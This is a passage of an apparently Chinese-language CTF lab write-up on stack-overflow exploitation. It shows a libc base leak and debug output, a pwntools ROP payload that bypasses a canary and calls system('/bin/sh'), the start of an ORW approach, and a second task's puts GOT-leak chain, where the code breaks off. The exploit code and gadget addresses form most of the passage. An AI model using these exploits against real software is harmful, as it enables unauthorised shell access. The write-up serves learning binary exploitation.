&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">libc_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">__libc_start_main_addr&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="n">__libc_start_main_offset&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;main_return_addr: &lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">main_return_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;__libc_start_main_addr:&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">__libc_start_main_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;libc_addr: &lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行效果如下：&lt;/p>
&lt;pre>[&lt;font color="#C01C28">&lt;b>DEBUG&lt;/b>&lt;/font>] Sent 0x118 bytes:
b&amp;apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH&amp;apos;
[&lt;font color="#C01C28">&lt;b>DEBUG&lt;/b>&lt;/font>] Received 0x126 bytes:
00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>AAAA│
*
00000100 41 41 41 41 41 41 41 41 41 41 42 42 43 43 44 44 │AAAA&lt;font color="#12488B">│&lt;/font>AAAA&lt;font color="#12488B">│&lt;/font>AABB&lt;font color="#12488B">│&lt;/font>CCDD│
00000110 45 45 46 46 47 47 48 48 &lt;font color="#12488B">90&lt;/font> &lt;font color="#12488B">9d&lt;/font> &lt;font color="#12488B">c2&lt;/font> 42 38 77 &lt;font color="#C01C28">0a&lt;/font> 69 │EEFF&lt;font color="#12488B">│&lt;/font>GGHH&lt;font color="#12488B">│···&lt;/font>B&lt;font color="#12488B">│&lt;/font>8w&lt;font color="#C01C28">·&lt;/font>i│
00000120 6e 70 75 74 3e 20 │nput&lt;font color="#12488B">│&lt;/font>&amp;gt; │
00000126
b&amp;apos;\x90\x9d\xc2B8w\x00\x00&amp;apos;
[&lt;font color="#12488B">&lt;b>*&lt;/b>&lt;/font>] waitwhat? 0x773842c29d90
[&lt;font color="#12488B">&lt;b>*&lt;/b>&lt;/font>] main_return_addr: 0000773842C29D90
[&lt;font color="#12488B">&lt;b>*&lt;/b>&lt;/font>] __libc_start_main_addr:0000773842C29DC0
[&lt;font color="#12488B">&lt;b>*&lt;/b>&lt;/font>] libc_addr: 0000773842C00000
&lt;/pre>
&lt;p>得到 libc 的地址为 &lt;code> 0x0000773842C00000&lt;/code>&lt;/p>
&lt;h3 id="getting-system-shell">Getting system shell
&lt;/h3>&lt;p>已经知道了 libc 的地址，那就从 libc 里面找 gadget：&lt;code>ROPgadget --binary ./libc.so.6 --only &amp;quot;pop|ret&amp;quot;&lt;/code>&lt;/p>
&lt;p>需要找一个 rdi_ret 与一个单独的 ret ，但是单独的 ret 空转的原因，上网说是因为&lt;strong>ubuntu18及以上&lt;/strong>在&lt;strong>调用system函数的时候会先进行一个检测&lt;/strong>，如果此时的&lt;strong>栈没有16字节对齐的话&lt;/strong>，就会&lt;strong>强行把程序crash掉&lt;/strong>，所以需要&lt;strong>栈对齐&lt;/strong> ，但我并没有看懂。无论如何，在 libc 里面找到了这样两个 gadgets：&lt;/p>
&lt;pre>0x000000000002a3e5 : pop rdi ; ret
0x0000000000029139 : ret&lt;/pre>
&lt;p>然后像下面这样构造 payload ，就可以直接获取 shell 了：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Getting system shell&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x0000000000029139&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rdi_rtn_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x000000000002a3e5&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">system_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;system&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span> &lt;span class="c1">#system函数的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">bin_sh_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">next&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">search&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s1">&amp;#39;/bin/sh&amp;#39;&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">libc_addr&lt;/span> &lt;span class="c1">#‘/bin/sh’的地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Canary&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;AABBCCDD&amp;#39;&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">ret_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rdi_rtn_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;system_addr:&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">system_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">log&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">info&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;bin_sh_addr:&lt;/span>&lt;span class="si">{:016X}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">format&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bin_sh_addr&lt;/span>&lt;span class="p">))&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x110&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recv&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mh">0x110&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">interactive&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>运行效果如下：&lt;/p>
&lt;p>&lt;img src="https://s2.loli.net/2024/07/29/RmdVi6tZyqKMfT2.png"
loading="lazy"
alt="image-20240727002154799.png"
>&lt;/p>
&lt;p>成功获得 flag 为 &lt;code>AAA{oh_R0P_1s_b4b@b4b@s1c~}&lt;/code>&lt;/p>
&lt;h3 id="approach-2-orw">Approach 2 ORW
&lt;/h3>&lt;p>ORW 即 &lt;code>open(file, olfag)&lt;/code> &lt;code>read(fd, buf, n_bytes)&lt;/code> 与 &lt;code>write(fd, buf, n_bytes)&lt;/code> 。&lt;/p>
&lt;p>所以要用 rdi 对应文件地址 &lt;code>file&lt;/code> 用于 open， 对应 &lt;code>fd&lt;/code> 项用于 read 与 write：在ORW中，我们需要设置 read 的 &lt;code>fd&lt;/code> 为 3，表示从文件中读取，write的 &lt;code>fd&lt;/code> 还是如常，依旧为 1 ；&lt;/p>
&lt;p>用 rsi 对应 &lt;code>oflag&lt;/code> 用于 open （由于只用读取就行了所以取 0 ），对应 &lt;code>buf&lt;/code> 用于 read 与 write；&lt;/p>
&lt;p>最后用 rdx 对应 &lt;code>n_bytes&lt;/code> 用于 read 与 write 。&lt;/p>
&lt;p>我们先前已经找到了 &lt;code>pop_rdi_ret&lt;/code> 的 gadget了，接着找 rsi 与 rdx 的 ：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">0x000000000011f2e7 : pop rdx ; pop r12 ; ret
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">0x000000000002be51 : pop rsi ; ret
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>所以对于调用 &lt;code>open(rdi -&amp;gt; &amp;quot;./flags.txt&amp;quot;, rsi -&amp;gt; 0)&lt;/code> ，我们可以将栈写成这个样子：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;code>pop_rdi_ret_addr&lt;/code>&lt;/th>
&lt;th>&lt;code>&amp;quot;./flags.txt&amp;quot;&lt;/code>&lt;/th>
&lt;th>&lt;code>pop_rsi_ret&lt;/code>&lt;/th>
&lt;th>0x00000000&lt;/th>
&lt;th>&lt;code>open_addr&lt;/code>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;/table>
&lt;p>对于调用 &lt;code>read(rdi -&amp;gt; 3, rsi -&amp;gt; oflag)&lt;/code> ，&lt;/p>
&lt;h2 id="task2-onerop">Task2 onerop
&lt;/h2>&lt;p>本题目的完整代码为 attachment 中的 &lt;code>pwnlab2_task2_code.py&lt;/code>&lt;/p>
&lt;h3 id="preparation--leaking-libc-addr">Preparation &amp;amp; Leaking libc addr
&lt;/h3>&lt;p>&lt;code>checksec&lt;/code> 一下，没有开 PIE 与 Canary，感觉比第一题友好多了，用 IDA 编译出来的 &lt;code>main()&lt;/code> 也是十分简单：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="kr">__fastcall&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="kt">int&lt;/span> &lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">**&lt;/span>&lt;span class="n">envp&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="kr">__int64&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">32&lt;/span>&lt;span class="p">];&lt;/span> &lt;span class="c1">// [rsp+0h] [rbp-100h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">initbuf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">argc&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">argv&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">envp&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">memset&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="k">sizeof&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">));&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">read&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">buf&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mh">0x1000uLL&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">puts&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">const&lt;/span> &lt;span class="kt">char&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">buf&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;code>0x100&lt;/code> 长的内存却给了 &lt;code>0x1000&lt;/code> 的读入，妥妥的栈溢出。&lt;/p>
&lt;p>用 ROPgadget 一看，甚至题目本身就有一些好用的 gadget：&lt;/p>
&lt;pre>0x00000000004011c5 : pop rdi ; ret
0x000000000040101a : ret
0x0000000000401181 : retf&lt;/pre>
&lt;p>再者，用 &lt;code>seccomp-tools dump&lt;/code> 查看，发现程序没有开启沙箱，可以考虑 get shell 了。现在要做的就是泄漏 libc 基址，然后使用 libc 的 &lt;code>system(/bin/sh)&lt;/code> 获取 shell 控制权。&lt;/p>
&lt;p>同时，使用 gdb 动态调试，在 Backtrace 栏中发现&lt;/p>
&lt;pre>&lt;font color="#12488B">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────&lt;/font>
► 0 0x40131a main+336
1 0x7ffff7c2a1ca __libc_start_call_main+122
2 0x7ffff7c2a28b __libc_start_main+139
3 0x4010b5 _start+37
&lt;/pre>
&lt;p>所以一开始的思路，就是利用栈溢出让 &lt;code>puts()&lt;/code> 函数输出 &lt;code>main()&lt;/code> 的返回地址（关于 &lt;code>__libc_start_call_main&lt;/code> 的偏移地址是 +122），而 &lt;code>__libc_start_call_main&lt;/code> 相对于 &lt;code>__libc_start_main&lt;/code> 的偏移地址是 -0xB0 ，可以因此求出 &lt;code>__libc_start_main&lt;/code> 的实际地址，然后求得 libc 的地址。但是由于没有循环，且正常流程只能进行一次输入，所以首次输入（尚不知道 libc 地址）就要构造 ROP 链使得 &lt;code>main()&lt;/code> 返回到它自身，然后在第二次输入（此时已经知道 libc 地址）构造 ROP 链以获取 shell 控制权。&lt;/p>
&lt;p>看起来很好，但是失败了——最后程序没有像设想的打开 shell，而是报段错误退出。为什么呢？ Debug 后发现，我们在第一次输入时为了让 &lt;code>main()&lt;/code> 返回到它自身，肯定要把原来 &lt;code>main()&lt;/code> 的返回地址覆盖掉，所以我们用 &lt;code>puts()&lt;/code> 函数输出的，其实是 &lt;code>main()&lt;/code> 的地址，而不是&lt;code>__libc_start_call_main + 122&lt;/code> ，这个思路错了。&lt;/p>
&lt;p>既然不能泄漏 &lt;code>main()&lt;/code> 原来的返回地址，那就泄漏 &lt;code>main()&lt;/code> 调用过的函数。看了一堆作题笔记后，发现 &lt;code>puts()&lt;/code> 比较好弄：&lt;/p>
&lt;p>我们第一次输入前，先求 &lt;code>puts()&lt;/code> 的 plt 与 got 地址（因为 glibc 的延迟绑定机制），然后通过第一次输入把栈覆写成这个形式：&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th>&lt;code>pop_rdi_ret_addr&lt;/code>&lt;/th>
&lt;th>&lt;code>puts_got&lt;/code>&lt;/th>
&lt;th>&lt;code>puts_plt&lt;/code>&lt;/th>
&lt;th>&lt;code>main_addr&lt;/code>&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;/table>
&lt;p>这样，我们在第一次输出后，&lt;code>main()&lt;/code> 函数 return （执行第一个 &lt;code>ret&lt;/code> 时 &lt;code>rbp&lt;/code> 指向 &lt;code>pop_rdi_ret_addr&lt;/code> ）到 &lt;code>pop rdi; ret;&lt;/code> 的 gadget， 就可以将 &lt;code>puts()&lt;/code> 的实际地址（在 GOT 表内，所以是 &lt;code>puts_got&lt;/code> ）作为参数传给 rdi ，然后再次 return （执行第二个 &lt;code>ret&lt;/code> 时 &lt;code>rbp&lt;/code> 指向 &lt;code>puts_plt&lt;/code> ）到 &lt;code>puts()&lt;/code> 函数从而输出它自己的实际地址，然后再 return 到 &lt;code>main()&lt;/code> 函数。我们就可以用 &lt;code>puts()&lt;/code> 函数的地址求 libc 的地址了。&lt;/p>
&lt;p>代码如下：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Step one Leaking puts() address &amp;amp; return to main() again&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">main_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00000000004011CA&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ret_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x000000000040101a&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">rdi_ret_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x00000000004011c5&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_plt&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">plt&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_got&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">elf&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">got&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_offsets&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">libc&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">symbols&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="s1">&amp;#39;puts&amp;#39;&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">offset&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mh">0x100&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="mh">0x8&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">payload1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;A&amp;#39;&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="n">offset&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rdi_ret_addr&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puts_got&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">puts_plt&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">+&lt;/span> &lt;span class="n">p64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">main_addr&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># pause()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">payload1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># conn.interactive();&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">#first puts()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">conn&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">recvline&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="c1">#second puts() outputs its addr&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">received1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">strip&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\n&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">received1&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">received1&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">ljust&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="sa">b&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="se">\0&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">puts_addr&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">u64&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">received1&lt;/span>&lt;span class="p">)&lt;/span>
